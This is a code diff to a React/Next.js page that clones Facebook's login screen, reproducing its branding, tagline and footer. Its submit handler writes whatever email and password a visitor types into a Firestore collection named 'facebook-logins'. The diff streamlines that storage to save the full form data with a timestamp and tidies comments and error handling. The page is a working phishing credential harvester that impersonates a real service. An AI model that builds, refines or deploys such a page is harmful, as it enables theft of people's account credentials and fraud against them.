@@ -1,8 +1,8 @@
 'use client';
 
 import { useState } from 'react';
-import { db } from "@/utils/firebase";
-import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
+import { db } from "@/utils/firebase";// Adjust the path as needed
+import { collection, addDoc, Timestamp } from 'firebase/firestore';
 
 export default function FacebookLoginPage() {
   const [submitted, setSubmitted] = useState(false);
@@ -16,14 +16,12 @@ export default function FacebookLoginPage() {
     e.preventDefault();
     try {
       await addDoc(collection(db, 'facebook-logins'), {
-        email: formData.email,
-        password: formData.password,
-        timestamp: serverTimestamp(),
+        ...formData,
+        timestamp: Timestamp.now()
       });
       setSubmitted(true);
     } catch (error) {
-      console.error("🔥 Firestore Error:", error);
-      alert("Failed to submit. Check console for details.");
+      console.error("Error saving data to Firestore:", error);
     }
   };
 
@@ -31,11 +29,13 @@ export default function FacebookLoginPage() {
     <>
       <div className="bg-[#f0f2f5] min-h-screen flex justify-center items-center text-black">
         <div className="w-full max-w-6xl flex flex-col md:flex-row justify-between items-center p-4">
+          {/* Left */}
           <div className="md:w-1/2 mb-10 md:mb-0 px-4 text-center md:text-left flex flex-col items-center md:items-start">
             <h1 className="text-[#1877f2] text-6xl font-bold mb-4 font-sans">facebook</h1>
             <p className="text-2xl font-normal text-black">Facebook helps you connect and share with the people in your life.</p>
           </div>
 
+          {/* Right */}
           <div className="bg-white p-6 rounded-lg mb-10 shadow-lg w-full max-w-md">
             <form onSubmit={handleSubmit}>
               <input
@@ -89,6 +89,7 @@ export default function FacebookLoginPage() {
         </div>
       </div>
 
+      {/* Footer */}
       <div className="bg-white pt-8 pb-12 px-4  text-center text-xs text-gray-500 space-y-4">
         <div className="max-w-6xl mx-auto flex mt-10 flex-wrap justify-center gap-x-4 gap-y-1 text-[#385898] font-normal text-sm">
           {[
